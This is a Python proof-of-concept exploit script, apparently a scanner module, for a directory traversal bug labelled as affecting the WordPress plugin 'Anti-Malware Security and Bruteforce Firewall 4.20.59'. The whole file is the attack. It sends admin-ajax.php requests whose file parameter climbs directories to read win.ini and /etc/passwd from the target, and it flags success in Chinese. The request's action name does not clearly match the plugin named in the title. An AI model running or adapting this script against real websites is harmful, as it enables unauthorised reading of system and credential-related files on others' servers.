# coding: utf-8
import requests
from bs4 import BeautifulSoup

#WordPress Plugin Anti-Malware Security and Bruteforce Firewall 4.20.59 - Directory Traversal
def poc(url,user_agent,proxy):

    url = url.strip("/")
    header = {
        "User-Agent": user_agent,
    }
    exp_url1=url+'/wp-admin/admin-ajax.php?action=duplicator_download&file=..\..\..\..\..\..\..\..\..\Windows\win.ini'
    exp_url2=url+'/wp-admin/admin-ajax.php?action=duplicator_download&file=..\..\..\..\..\..\..\..\..\etc\passwd'
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response1 = requests.post(exp_url1, headers=header,proxies=proxies)
        response2= requests.post(exp_url2, headers=header,proxies=proxies)

    else:
        response1 = requests.post(exp_url1, headers=header)
        response2 = requests.post(exp_url2, headers=header)
    # print(response1.text)
    # print(response2.text)
    if response1.status_code==200 and "file name" in response1.text or response2.status_code==200 and "file name" in response2.text:
        return "WordPress Plugin Anti-Malware Security and Bruteforce Firewall 4.20.59 - 目录穿越漏洞"


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','127.0.0.1:8080')

